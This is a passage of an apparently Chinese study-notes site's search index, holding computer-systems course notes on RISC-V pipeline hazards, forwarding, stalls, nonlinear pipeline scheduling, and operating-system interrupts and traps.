</li> <li>\u6d41\u6c34\u7ebf\u5b9e\u73b0\uff1a<ul> <li>\u6dfb\u52a0\u9636\u6bb5\u5bc4\u5b58\u5668\uff08pipeline register\uff09\u6765\u5206\u9694\u6bcf\u4e2a\u9636\u6bb5\uff1aIF/ID\u3001ID/EX\u3001EX/MEM\u3001MEM/WB<ul> <li>\u8fd9\u56db\u4e2a\u9636\u6bb5\u5bc4\u5b58\u5668\u548c PC \u5bc4\u5b58\u5668\u4e00\u8d77\u5c06\u6d41\u6c34\u7ebf\u5206\u4e3a\u4e86\u4e94\u4e2a\u90e8\u5206</li> <li>\u53ef\u4ee5\u770b\u4f5c\u53ea\u6709\u8fd9\u4e94\u4e2a\u65f6\u5e8f\u7535\u8def\uff0c\u5176\u5b83\u5185\u90e8\u64cd\u4f5c\u90fd\u662f\u7ec4\u5408\u903b\u8f91\uff0c\u5728\u5185\u90e8\u8fd0\u884c</li> <li>\u4e94\u4e2a\u5bc4\u5b58\u5668\u5728\u4e0a\u5347\u6cbf\u8fdb\u884c\u66f4\u65b0\uff0c\u9636\u6bb5\u5bc4\u5b58\u5668\u8fdb\u884c\u6d41\u8f6c\uff0c\u8bb0\u5f55\u5f53\u524d\u6307\u4ee4\u9700\u8981\u7684\u4fe1\u606f</li> </ul> </li> <li>\u6570\u636e\u901a\u8def\u4e2d\u6709\u4e24\u4e2a\u56de\u8def<ul> <li>MEM \u9636\u6bb5\u8ba1\u7b97\u5206\u652f\u7ed3\u679c\uff0c\u8f93\u51fa\u7ed9 PC\u3002\u53ef\u80fd\u4f1a\u5f15\u8d77\u63a7\u5236\u5192\u9669</li> <li>WB \u9636\u6bb5\u5199\u56de\u5bc4\u5b58\u5668\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u6570\u636e\u5192\u9669</li> </ul> </li> <li>ID \u548c WB \u9636\u6bb5\u540c\u65f6\u4f7f\u7528\u5bc4\u5b58\u5668\u7ec4\u6587\u4ef6\uff0c\u4f46\u4e0d\u4f1a\u4ea7\u751f\u7ed3\u6784\u5192\u9669\uff0c\u56e0\u4e3a ID \u9636\u6bb5\u53ea\u8bfb\u53d6\u5bc4\u5b58\u5668\uff0cWB \u9636\u6bb5\u53ea\u5199\u5165\u5bc4\u5b58\u5668\uff0c\u76f8\u5f53\u4e8e\u5206\u4e3a\u4e86\u4e24\u4e2a\u90e8\u5206</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic1/#_10","title":"\u5192\u9669\u89e3\u51b3","text":"<p>\u5728 RISC-V \u4e94\u9636\u6d41\u6c34\u7ebf\u4e2d\u5192\u9669\u7684\u5177\u4f53\u89e3\u51b3\u65b9\u6cd5\u3002</p>"},{"location":"cs/system/cs2/topic1/#_11","title":"\u6570\u636e\u5192\u9669","text":"<ul> <li>\u5373\u540e\u9762\u7684\u6307\u4ee4\u9700\u8981\u4ece\u5bc4\u5b58\u5668\u7ec4\u4e2d\u8bfb\u53d6\u524d\u9762\u7684\u6307\u4ee4\u5199\u5165\u7684\u7ed3\u679c</li> <li>RISC-V \u6d41\u6c34\u7ebf\u4e2d\u6709\u4e24\u79cd\u60c5\u51b5<ul> <li>use-use hazard\uff1a\u5373\u4e24\u6761 R \u578b\u6307\u4ee4\u4ea7\u751f\u4e86\u6570\u636e\u5192\u9669\uff0c\u53ef\u5206\u4e3a\u51e0\u79cd\u60c5\u51b5\uff1a</li> <li>\u4e24\u6761\u6307\u4ee4\u76f8\u90bb<ul> <li>\u4e24\u6761\u6307\u4ee4\u95f4\u9694\u4e00\u6761</li> <li>\u4e24\u6761\u6307\u4ee4\u95f4\u9694\u4e24\u6761\uff08\u53ef\u901a\u8fc7\u6539\u8fdb\u5bc4\u5b58\u5668\u7ec4\u89e3\u51b3\uff09</li> </ul> </li> <li>load-use hazard\uff1a\u5373\u4e00\u6761 load \u6307\u4ee4\u548c\u4e00\u6761 R \u578b\u6307\u4ee4\u4ea7\u751f\u4e86\u6570\u636e\u5192\u9669</li> </ul> </li> </ul> <p>\u4e0a\u56fe\u662f use-use \u7c7b\u578b\u5192\u9669\u7684\u793a\u610f\u56fe\uff0c\u5176\u4e2d\u7ea2\u8272\u7ebf\u8868\u793a\u6b63\u5e38\u60c5\u51b5\u4e0b\u8bfb\u53d6-\u8bbf\u95ee\u7684\u5173\u7cfb\uff0c\u84dd\u8272\u7ebf\u8868\u793a\u901a\u8fc7\u524d\u9012\u6280\u672f\u89e3\u51b3\u5192\u9669\u65f6\u7684\u8bfb\u53d6-\u8bbf\u95ee\u5173\u7cfb\u3002</p>"},{"location":"cs/system/cs2/topic1/#forwarding","title":"\u524d\u9012\uff08Forwarding\uff09","text":"<ul> <li>\u5373\u5982\u4e0a\u56fe\uff0c\u901a\u8fc7\u6dfb\u52a0\u786c\u4ef6\u8fde\u63a5\u7684\u65b9\u5f0f\u6765\u5c06\u524d\u4e00\u6761\u6307\u4ee4 ALU \u7684\u8f93\u51fa\u76f4\u63a5\u4f20\u9012\u7ed9\u540e\u9762\u6307\u4ee4\u7684 ALU \u8f93\u5165\uff0c\u800c\u5ffd\u7565\u5bc4\u5b58\u5668</li> <li>\u9700\u8981\u5728\u540e\u4e00\u6761\u51b2\u7a81\u6307\u4ee4\u7684 EX \u9636\u6bb5\u8fdb\u884c\u5224\u65ad\uff0c\u901a\u8fc7\u591a\u8def\u9009\u62e9\u5668\u9009\u62e9 ALU \u8f93\u5165\u6765\u6e90\uff08\u539f\u6837\u8fd8\u662f\u5229\u7528\u524d\u9012\u4f20\u9012\u7684\u6570\u636e\uff09</li> </ul>"},{"location":"cs/system/cs2/topic1/#_12","title":"\u63a2\u6d4b\u5192\u9669","text":"<p>\u5982\u4e0a\u56fe\uff0c\u9700\u8981\u5173\u6ce8\u7684\u4e3a\u865a\u7ebf\u6846\u8d77\u6765\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u6e05\u6670\u7684\u77e5\u9053\uff0c\u63a2\u6d4b\u65b9\u5f0f\u662f\uff1a</p> <ul> <li>\u76f8\u90bb\u6307\u4ee4\uff08EX hazard\uff09<ul> <li>EX/MEM.RegWrite == 1\uff1a\u5373\u524d\u4e00\u6761\u6307\u4ee4\u5199\u5165\u4e86\u5bc4\u5b58\u5668</li> <li>EX/MEM.Rd != 0\uff1a\u5373\u524d\u4e00\u6761\u6307\u4ee4\u5199\u5165\u7684\u4e0d\u662f x0\uff08\u5982\u679c\u662f x0 \u5219\u4e0d\u4f1a\u53d1\u751f\u4efb\u4f55\u53d8\u5316\uff09</li> <li>EX/MEM.Rd == ID/EX.Rs1 \u6216 ID/EX.Rs2\uff1a\u5373\u524d\u4e00\u6761\u6307\u4ee4\u5199\u5165\u7684\u5bc4\u5b58\u5668\u4e0e\u540e\u4e00\u6761\u6307\u4ee4\u67d0\u4e00\u64cd\u4f5c\u6570\u76f8\u540c</li> </ul> </li> <li>\u9694\u4e00\u6761\u6307\u4ee4\uff08MEM hazard\uff09\u540c\u7406<ul> <li>MEM/WB.RegWrite == 1</li> <li>MEM/WB.Rd != 0</li> <li>MEM/WB.Rd == ID/EX.Rs1 \u6216 ID/EX.Rs2</li> </ul> </li> </ul> <p>\u786c\u4ef6\u8bbe\u8ba1\uff1a</p> <p> </p> <p>\u7b80\u5316\u5f97\u5230\u76f8\u5173\u7684\u901a\u8def\u56fe\u5982\u4e0a\uff0c\u5373\u589e\u52a0\u4e00\u4e2a Forwarding Unit \u6765\u5224\u65ad\u5192\u9669\uff0c\u5e76\u4e14\u7ed9\u51fa\u4e24\u4e2a\u63a7\u5236\u4fe1\u53f7\uff08ForwardA \u548c ForwardB\uff09\u6765\u9009\u62e9 ALU \u7684\u8f93\u5165\u3002\u9664\u6b64\u4e4b\u5916\uff0cEX/MEM \u548c MEM/WB \u9636\u6bb5\u7684 reg_write \u63a7\u5236\u4fe1\u53f7\u4e5f\u8981\u4f20\u7ed9 Forwarding Unit\u3002</p>"},{"location":"cs/system/cs2/topic1/#_13","title":"\u53cc\u91cd\u5192\u9669","text":"<ul> <li>\u53cc\u91cd\u5192\u9669\uff08double data hazard\uff09\u5373\u6709\u4e09\u6761\u6307\u4ee4\u8fde\u7eed\uff0c\u4e14\u90fd\u6709\u51b2\u7a81\uff0c\u4f8b\u5982     <pre><code>add x1, x1, x2\nadd x1, x1, x3\nadd x1, x1, x4\n</code></pre></li> <li>\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5e94\u8be5\u7b97\u4f5c\u4e24\u4e2a EX hazard\uff08\u5373\u76f8\u90bb\u7684\u4e24\u6761\u7b97\u4e00\u6b21\u51b2\u7a81\uff09</li> <li>\u56e0\u6b64\u9700\u8981\u6539\u8fdb MEM hazard \u7684\u5224\u65ad\uff0c\u9632\u6b62\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u7b2c\u4e09\u6761\u6307\u4ee4\u7684 x1 \u8bfb\u53d6\u5230\u7b2c\u4e00\u6761\u6307\u4ee4\u7684\u7ed3\u679c\uff0c\u5373\u5b58\u5728 EX hazard \u65f6\u4e0d\u8ba4\u4e3a\u5b58\u5728 MEM hazard\uff1a<ul> <li>MEM/WB.RegWrite == 1</li> <li>MEM/WB.Rd != 0</li> <li>\u6ca1\u6709 EX hazard<ul> <li>not(EX/MEM.RegWrite == 1 and EX/MEM.Rd != 0 and EX/MEM.Rd == ID/EX.Rs1 \u6216 ID/EX.Rs2)</li> </ul> </li> <li>MEM/WB.Rd == ID/EX.Rs1 \u6216 ID/EX.Rs2</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic1/#stall","title":"\u6682\u505c\uff08Stall\uff09","text":"<ul> <li>load-use \u60c5\u51b5\u4e0b ALU \u7684\u8f93\u5165\u6765\u81ea\u524d\u4e00\u6761\u6307\u4ee4 Data Memory \u7684\u8f93\u51fa\u800c\u975e\u524d\u9762\u6307\u4ee4\u7684 ALU \u7ed3\u679c\uff0c\u56e0\u6b64\u9700\u8981\u989d\u5916\u7684\u4e00\u6b21 bubble\uff08\u6682\u505c\u4e00\u4e2a\u5468\u671f\uff09</li> <li>\u63a2\u6d4b\uff0c\u9700\u8981\u63d0\u524d\u5728 ID \u9636\u6bb5\u5c31\u8fdb\u884c\u63a2\u6d4b load-use \u5192\u9669\uff0c\u5982\u679c\u5b58\u5728\u5c31\u6682\u505c\u3001\u63d2\u5165 bubble<ul> <li>ID/EX.MemRead == 1 (ID/EX.MemWrite == 0)</li> <li>ID/EX.Rd == IF/ID.Rs1 \u6216 IF/ID.Rs2</li> </ul> </li> <li>\u6682\u505c\u6d41\u6c34\u7ebf<ul> <li>\u5f3a\u5236 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u4e2d\u7684\u63a7\u5236\u4fe1\u53f7\u53d8\u4e3a 0\uff08\u76f8\u5f53\u4e8e\u63d2\u5165\u4e00\u6761 nop\uff09</li> <li>\u963b\u6b62 PC \u5bc4\u5b58\u5668\u548c IF/ID \u9636\u6bb5\u5bc4\u5b58\u5668\u66f4\u65b0</li> </ul> </li> <li>\u5bf9\u4e8e load-use \u5192\u9669\uff0c\u5728\u6682\u505c\u4e00\u4e2a\u5468\u671f\u540e\u5c31\u53ef\u4ee5\u6309\u7167 MEM hazard \u8fdb\u884c\u524d\u9012\u89e3\u51b3</li> </ul> <p>\u5982\u4e0a\u56fe\u6240\u793a\uff0c\u7b2c\u4e8c\u6761\u6307\u4ee4\u5728 ID \u9636\u6bb5\u65f6\u68c0\u6d4b\u5230\u5b58\u5728 load-use \u5192\u9669\uff0c\u5728\u6b64\u6682\u505c\uff0c\u7136\u540e\u4e0b\u4e00\u4e2a\u5468\u671f\u7ee7\u7eed\u8fd0\u884c\uff0c\u8fd9\u6837\u4e2d\u95f4\u5c31\u591a\u4e86\u4e00\u6761 bubble\uff0c\u7136\u540e\u5728 EX \u9636\u6bb5\u5c31\u53ef\u4ee5\u6b63\u5e38\u63a5\u6536\u5230 MEM hazard \u7684\u524d\u9012\u503c\u4e86\u3002</p> <p>\u5177\u4f53\u7684\u786c\u4ef6\u5b9e\u73b0\u548c\u524d\u9762\u7c7b\u4f3c\uff0c\u5728 ID \u9636\u6bb5\u52a0\u4e00\u4e2a Hazard Detection Unit \u6765\u68c0\u6d4b load-use \u5192\u9669\uff0c\u63a5\u6536\u5b83\u9700\u8981\u7684\u503c\uff0c\u8f93\u51fa PCWrite\u3001IF/IDWrite \u63a7\u5236\u4fe1\u53f7\uff08\u65b0\u589e\uff09\u4ee5\u53ca\u4e00\u4e2a\u63a7\u5236\u4fe1\u53f7\u7528\u6765\u9009\u62e9 ID/EX \u9636\u6bb5\u5bc4\u5b58\u5668\u7684\u63a7\u5236\u4fe1\u53f7\u90e8\u5206\u6765\u81ea\u63a7\u5236\u5355\u5143\u8fd8\u662f\u7f6e\u96f6\u3002</p>"},{"location":"cs/system/cs2/topic1/#_14","title":"\u5206\u652f\u5192\u9669","text":"<p>TODO</p>"},{"location":"cs/system/cs2/topic1/#_15","title":"\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u8c03\u5ea6","text":"<ul> <li>\u7ebf\u6027\u6d41\u6c34\u7ebf\u9010\u4e2a\u8fd0\u884c\u6bcf\u4e00\u4e2a\u9636\u6bb5\uff0c\u6bcf\u4e00\u4e2a\u9636\u6bb5\u90fd\u4f1a\u8fd0\u884c\u4e14\u4ec5\u8fd0\u884c\u4e00\u6b21\uff0c\u6ca1\u6709\u53cd\u9988\u548c\u524d\u9988</li> <li>\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u5b58\u5728\u53cd\u9988\u548c\u524d\u9988\u8fde\u63a5\uff0c\u5176\u4e00\u4e2a\u9636\u6bb5\uff08\u90e8\u4ef6\uff09\u53ef\u80fd\u4f7f\u7528\u4e00\u6b21\u6216\u591a\u6b21</li> <li>\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u4ec5\u901a\u8fc7\u8fde\u63a5\u56fe\u4e0d\u80fd\u591f\u786e\u5b9a\u6d41\u6c34\u7ebf\u7684\u8fd0\u884c\u987a\u5e8f\uff0c\u4e00\u4e2a\u8fde\u63a5\u56fe\u53ef\u80fd\u5bf9\u5e94\u591a\u4e2a\u4e0d\u540c\u7684\u8fd0\u884c\u987a\u5e8f</li> <li>\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u7684\u8fd0\u884c\u9700\u8981\u901a\u8fc7\u9884\u7ea6\u8868\uff08reservation table\uff09\u6765\u8868\u793a<ul> <li>\u6bcf\u4e00\u884c\u8868\u793a\u4e00\u4e2a\u9636\u6bb5\uff0c\u6bcf\u4e00\u5217\u8868\u793a\u4e00\u4e2a\u65f6\u949f\u5468\u671f</li> <li>\u6574\u4e2a\u8868\u8868\u793a\u4e00\u4e2a\u4efb\u52a1\u7684\u8fd0\u884c\u6d41\u7a0b\uff0c\u5982\u679c\u5728\u67d0\u4e2a\u5468\u671f\u8fd0\u884c\u67d0\u4e00\u9636\u6bb5\uff0c\u5219\u5728\u5bf9\u5e94\u4f4d\u7f6e\u6253\u4e0a X</li> <li>\u7ebf\u6027\u6d41\u6c34\u7ebf\u4e5f\u6709\u9884\u7ea6\u8868\uff0c\u4e0d\u8fc7\u90fd\u662f\u56fa\u5b9a\u7684\uff0c\u4e3a\u4e00\u4e2a\u6b63\u65b9\u5f62\u8868\u683c\uff0c\u5bf9\u89d2\u7ebf\u4e0a\u90fd\u662f X</li> </ul> </li> </ul> <p>\u5982\u4e0b\u56fe\u5c31\u662f\u4e00\u4e2a\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u7684\u8fde\u63a5\u56fe\uff0c\u548c\u5b83\u7684\u4e00\u4e2a\u9884\u7ea6\u8868\uff1a</p> <p> </p> 1 2 3 4 5 6 7 S1 X X X S2 X X S3 X X S4 X <ul> <li>\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u4e0d\u80fd\u50cf\u7ebf\u6027\u6d41\u6c34\u7ebf\u4e00\u6837\u76f4\u63a5\u9010\u4e2a\u4efb\u52a1\u8d34\u5728\u4e00\u8d77\u4f9d\u6b21\u8fd0\u884c\uff0c\u56e0\u4e3a\u4f1a\u51fa\u73b0\u51b2\u7a81\uff08\u540c\u4e00\u5468\u671f\u4e0d\u540c\u4efb\u52a1\u4f7f\u7528\u540c\u4e00\u9636\u6bb5\uff0c\u5373\u7ed3\u6784\u5192\u9669\uff09</li> <li>\u975e\u7ebf\u5f62\u6d41\u6c34\u7ebf\u9700\u8981\u901a\u8fc7\u8c03\u5ea6\u7b97\u6cd5\u6765\u627e\u5230\u6700\u4f18\u7684\u4efb\u52a1\u542f\u52a8\u65b9\u5f0f\uff0c\u4f7f\u5f97\u4efb\u52a1\u95f4\u4e0d\u4f1a\u4ea7\u751f\u51b2\u7a81\uff0c\u800c\u4e14\u8fd0\u884c\u6700\u9ad8\u6548</li> <li>\u7b2c\u4e00\u4e2a\u4efb\u52a1\u8fdb\u5165\u6d41\u6c34\u7ebf\u540e\uff0c\u7b2c\u4e8c\u4e2a\u4efb\u52a1\u8fdb\u5165\u4e14\u4e0d\u53d1\u751f\u51b2\u7a81\u7684\u65f6\u95f4\u79f0\u4e3a\u542f\u52a8\u8ddd\u79bb\u3002\u5728\u540c\u4e00\u4e2a\u8c03\u5ea6\u65b9\u5f0f\u4e2d\u542f\u52a8\u8ddd\u79bb\u53ef\u80fd\u4e0d\u540c\uff0c\u6700\u4f73\u7684\u8c03\u5ea6\u65b9\u5f0f\u662f\u4f7f\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u6700\u77ed</li> </ul>"},{"location":"cs/system/cs2/topic1/#_16","title":"\u975e\u7ebf\u6027\u6d41\u6c34\u7ebf\u8c03\u5ea6\u7b97\u6cd5","text":"<p>\u4e24\u4e2a\u6982\u5ff5\uff1a</p> <ul> <li>\u7981\u6b62\u96c6\u5408\uff08prohibit sets\uff09\uff0c\u6307\u9884\u7ea6\u8868\u4e2d\u6bcf\u4e00\u884c\u4efb\u610f\u4e24\u4e2a X \u4e4b\u95f4\u7684\u8ddd\u79bb\u6784\u6210\u7684\u96c6\u5408\u3002\u610f\u4e49\u4e3a\uff1a\u4e24\u4e2a\u4efb\u52a1\u4e4b\u95f4\u7684\u95f4\u9694\u4e0d\u80fd\u662f\u8fd9\u4e2a\u96c6\u5408\u4e2d\u7684\u4efb\u610f\u4e00\u4e2a\u503c</li> <li>\u51b2\u7a81\u5411\u91cf\uff08conflict vector\uff09\uff0c\u8868\u793a\u4e3a \\((C_m, C_{m-1}, \\cdots, C_2, C_1)\\)\uff0c\u5176\u4e2d \\(m\\) \u4e3a\u7981\u6b62\u96c6\u5408\u4e2d\u7684\u6700\u5927\u503c\uff0c\u5982\u679c \\(i\\) \u5728\u7981\u6b62\u96c6\u5408\u4e2d\uff0c\u5219 \\(C_i=1\\) \u5426\u5219 \\(C_i=0\\)</li> </ul> <p>\u5bf9\u4e8e\u4e0a\u9762\u7684\u9884\u7ea6\u8868\uff0c\u7981\u6b62\u96c6\u5408\u4e3a \\(F=\\{3, 4, 6\\}\\)\uff0c\u521d\u59cb\u51b2\u7a81\u5411\u91cf\u4e3a \\(C=\\mathtt{101100}\\)\u3002</p> <p>\u56e0\u6b64\u53c2\u8003\u4e8e\u521d\u59cb\u51b2\u7a81\u5411\u91cf\uff0c\u4e0b\u4e00\u4e2a\u4efb\u52a1\u53ea\u53ef\u80fd\u5728\u540e\u7b2c 1\u30012\u30015\u30017 \u4e2a\u5468\u671f\u8fdb\u5165\uff08\u53f3\u6570 1\u30012\u30015 \u4f4d\u4e3a 0\uff0c7 \u4e3a\u603b\u957f\u5ea6\u52a0\u4e00\uff0c\u76f8\u5f53\u4e8e\u786c\u7b49\u4e00\u4e2a\u4efb\u52a1\u7684\u65f6\u5e38\uff09\u3002\u4ee5\u540e\u7b2c\u4e00\u4e2a\u5468\u671f\u8fdb\u5165\u4e3a\u4f8b\u3002\u7b2c\u4e8c\u4e2a\u4efb\u52a1\u7684\u521d\u59cb\u51b2\u7a81\u5411\u91cf\u4e5f\u4e3a \\(C=\\mathtt{101100}\\)\uff0c\u6b64\u65f6\u7b2c\u4e00\u4e2a\u4efb\u52a1\u7ecf\u8fc7\u4e86\u4e00\u4e2a\u5468\u671f\uff0c\u51b2\u7a81\u5411\u91cf\u53f3\u79fb\u4e00\u4f4d\u53d8\u4e3a \\(C=\\mathtt{10110}\\)\u3002\u63a5\u7740\u518d\u8003\u8651\u52a0\u5165\u7b2c\u4e09\u4e2a\u4efb\u52a1\uff0c\u8fd9\u4e2a\u4efb\u52a1\u4e0d\u80fd\u548c 1\u30012 \u4e24\u4e2a\u51b2\u7a81\uff0c\u6240\u4ee5\u6b64\u65f6\u6574\u4f53\u7684\u51b2\u7a81\u5411\u91cf\u5e94\u8be5\u662f\u524d\u4e24\u4e2a\u4efb\u52a1\u6b64\u65f6\u7684\u51b2\u7a81\u5411\u91cf\u6309\u4f4d\u6c42\u6216\uff0c\u5373 \\(\\mathtt{101100} | \\mathtt{10110} = \\mathtt{111110}\\)\u3002\u6240\u4ee5\u7b2c\u4e09\u4e2a\u4efb\u52a1\u53ea\u80fd\u5728\u540e\u4e00\u4e2a\u5468\u671f\u8fdb\u5165\u3002</p> <p>\u8fd9\u6837\u4f9d\u6b64\u7c7b\u63a8\uff0c\u6700\u7ec8\u4e0d\u518d\u8ba1\u7b97\u4e0b\u53bb\u7684\u6761\u4ef6\u4e3a\uff1a\u51b2\u7a81\u5411\u91cf\u53d8\u4e3a\u4e86\u5168 1\uff0c\u53ea\u80fd\u7b49\u5f85\u4e00\u4e2a\u4efb\u52a1\u7684\u65f6\u957f\u56de\u5230\u521d\u59cb\u72b6\u6001\uff1b\u6216\u8005\u5f97\u5230\u7684\u51b2\u7a81\u5411\u91cf\u548c\u4e4b\u524d\u7684\u67d0\u4e2a\u76f8\u540c\uff08\u8fbe\u6210\u4e86\u5faa\u73af\uff09\u3002\u6700\u7ec8\u53ef\u4ee5\u753b\u51fa\u4e00\u4e2a\u72b6\u6001\u56fe\u3002</p> <p>\u5bf9\u4e8e\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5b83\u7684\u72b6\u6001\u56fe\u5982\u4e0b\uff08\u65b9\u5757\u5185\u4e3a\u51b2\u7a81\u5411\u91cf\uff0c\u7bad\u5934\u4e0a\u4e3a\u7b49\u5f85\u51e0\u4e2a\u5468\u671f\u8fdb\u5165\uff0c\u5373\u542f\u52a8\u8ddd\u79bb\uff09\uff1a</p> <p> </p> <p>\u6240\u4ee5\u5b83\u7684\u51e0\u79cd\u8c03\u5ea6\u65b9\u5f0f\uff08\u7528\u542f\u52a8\u8ddd\u79bb\u8868\u793a\uff09\u548c\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u4e3a\uff1a</p> \u8c03\u5ea6\u65b9\u5f0f \u5e73\u5747\u542f\u52a8\u8ddd\u79bb 7 7 1, 7 4 1, 1, 7 3 2, 7 4.5 2, 5 3.5 2, 5, 7 4.67 5 5 5, 2 3.5 5, 7 6 <p>\u6240\u4ee5\u6700\u77ed\u5e73\u5747\u542f\u52a8\u8ddd\u79bb\u4e3a 3\uff0c\u5bf9\u5e94\u7684\u8c03\u5ea6\u65b9\u5f0f\u4e3a 1\u30011\u30017\u3002</p>"},{"location":"cs/system/cs2/topic2/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b80\u4ecb","text":"<p> \u7ea6 1164 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b2c 7 \u81f3 8 \u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/system/cs2/topic2/#_2","title":"\u4e2d\u65ad\u548c\u9677\u9631","text":""},{"location":"cs/system/cs2/topic2/#_3","title":"\u786c\u4ef6\u4e2d\u65ad","text":"<ul> <li>\u5916\u90e8 IO \u8bbe\u5907\u6709\u4e8b\u60c5\u8981\u901a\u77e5 CPU \u8fdb\u884c\u5904\u7406\uff0c\u901a\u8fc7\u4e2d\u65ad\u5b8c\u6210</li> <li>\u786c\u4ef6\u90e8\u5206\uff1a<ul> <li>CPU \u5185\u90e8\u6709\u4e2d\u65ad\u63a7\u5236\u5668</li> <li>IO \u901a\u8fc7\u786c\u4ef6\u8fde\u7ebf\u5411\u4e2d\u65ad\u63a7\u5236\u5668\u53d1\u9001\u4fe1\u53f7</li> <li>CPU \u53d1\u73b0\u6709\u4e2d\u65ad\u5728 pending</li> <li>CPU \u5c06 pc \u8bbe\u7f6e\u4e3a\u4e2d\u65ad\u5411\u91cf\u5f00\u59cb\u7684\u4f4d\u7f6e</li> </ul> </li> <li>\u8f6f\u4ef6\u90e8\u5206\uff1a<ul> <li>\u8df3\u8f6c\u7684\u4f4d\u7f6e\u5b58\u653e\u4e86\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\uff08Interrupt Service Routine\uff0cISR\uff09</li> <li>\u5173\u6389\u4e2d\u65ad\uff08\u4e0d\u5e0c\u671b\u5728\u5904\u7406\u4e2d\u65ad\u7684\u65f6\u5019\u518d\u6b21\u51fa\u73b0\u4e2d\u65ad\u65f6\u88ab CPU \u8df3\u8f6c pc\uff09</li> <li>\u68c0\u67e5\u76ee\u524d\u662f\u4ec0\u4e48\u4e2d\u65ad\uff0c\u5e76\u4e14 dispatch \u5230\u6307\u5b9a\u7684\u5904\u7406\u7a0b\u5e8f\uff08interrupt handler\uff09</li> <li>\u4e0a\u4e0b\u6587\u5904\u7406\uff1a<ul> <li>\u5728\u4e2d\u65ad\u5904\u7406\u524d\u8981\u4fdd\u5b58\u4e0a\u4e0b\u6587\uff08pc \u7b49\u7cfb\u5217\u5bc4\u5b58\u5668\uff09</li> <li>\u5904\u7406\u540e\u6062\u590d\u4e0a\u4e0b\u6587\uff0c\u7ee7\u7eed\u6267\u884c\u539f\u6765\u7a0b\u5e8f</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic2/#_4","title":"\u9677\u9631","text":"<ul> <li>trap\uff0c\u53c8\u53eb\u8f6f\u4e2d\u65ad\uff08soft interrupt\uff09</li> <li>\u786c\u4ef6\u4e2d\u65ad\uff0c\u7531\u786c\u4ef6\u4ea7\u751f\uff0c\u6709\u5916\u8bbe\u786c\u4ef6\u4e8b\u4ef6\u8981\u5904\u7406<ul> <li>\u662f\u4e00\u4e2a\u5f02\u6b65\u4e8b\u4ef6\uff08asynchronous\uff09\uff0c\u5373\u65e0\u6cd5\u9884\u6d4b\u51fa\u73b0\u7684\u65f6\u95f4</li> </ul> </li> <li>trap \u7531\u8f6f\u4ef6\u4ea7\u751f\uff0c\u53ef\u80fd\u662f\u8fd0\u884c\u51fa\u73b0\u4e86\u9519\u8bef\u6216\u8005\u7528\u6237\u663e\u5f0f\u5730\u8bf7\u6c42\u4e2d\u65ad<ul> <li>\u662f\u4e00\u4e2a\u540c\u6b65\u65f6\u95f4\uff08synchronous\uff09</li> <li>\u4f8b\u5982\uff1a\u7cfb\u7edf\u8c03\u7528\uff0cdivided-by-zero \u5f02\u5e38\u2026\u2026</li> </ul> </li> </ul> <p>\u64cd\u4f5c\u7cfb\u7edf\u662f interrupt-driven \u7684</p> <ul> <li>\u7279\u6b8a\u7684\u4e2d\u65ad\uff1a\u8ba1\u65f6\u5668\u4e2d\u65ad</li> <li>\u5b9a\u65f6\u4ea7\u751f\u8ba1\u65f6\u5668\u4e2d\u65ad\uff0c\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u5f97\u5230\u673a\u4f1a\u8fd0\u884c\uff0c\u8fdb\u884c\u8bc4\u4f30\u3001\u8c03\u5ea6</li> <li>\u5426\u5219\u5982\u679c\u6ca1\u6709\u5176\u5b83\u4e2d\u65ad\u4ea7\u751f\uff0c\u5219\u7528\u6237\u6001\u7a0b\u5e8f\u4f1a\u4e00\u76f4\u8fd0\u884c\u5360\u7528\u8d44\u6e90\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4e5f\u6ca1\u6709\u673a\u4f1a\u4ecb\u5165\u7ba1\u7406</li> </ul>"},{"location":"cs/system/cs2/topic2/#_5","title":"\u4e2d\u65ad\u5904\u7406","text":"<ul> <li>\u5148\u8fdb\u884c CPU \u6267\u884c\u72b6\u6001\u7684\u4fdd\u5b58<ul> <li>\u5c06 pc \u7b49\u5bc4\u5b58\u5668\u4fdd\u5b58\u5728\u5185\u5b58\u4e2d</li> </ul> </li> <li>\u4e24\u79cd\u5904\u7406\u673a\u5236<ul> <li>vectored interrupt system\uff1a<ul> <li>\u786c\u4ef6\u4e2d\u65ad\u4ea7\u751f\u4e0d\u4f1a\u5230\u7edf\u4e00\u7684\u5730\u5740</li> <li>\u8bb0\u5f55\u4e00\u4e2a\u4e2d\u65ad\u5411\u91cf\u57fa\u5730\u5740\uff0c\u540e\u9762\u4f9d\u6b21\u5b58\u50a8\u5404\u4e2a\u4e2d\u65ad\u53f7\u5bf9\u5e94\u7684\u5904\u7406\u7a0b\u5e8f\u5730\u5740</li> <li>\u76f4\u63a5\u6839\u636e\u4e2d\u65ad\u53f7\u6765\u8ba1\u7b97\u504f\u79fb\uff0c\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684\u5904\u7406\u7a0b\u5e8f\u4e2d</li> </ul> </li> <li>polling\uff1a<ul> <li>\u6240\u6709\u4e2d\u65ad\u90fd\u8df3\u8f6c\u5230\u7edf\u4e00\u7684\u5730\u5740</li> <li>\u7531\u8f6f\u4ef6\u6765\u533a\u5206\u4e2d\u65ad\u79cd\u7c7b\uff0c\u51b3\u5b9a\u5982\u4f55\u5904\u7406\u7b49</li> </ul> </li> </ul> </li> 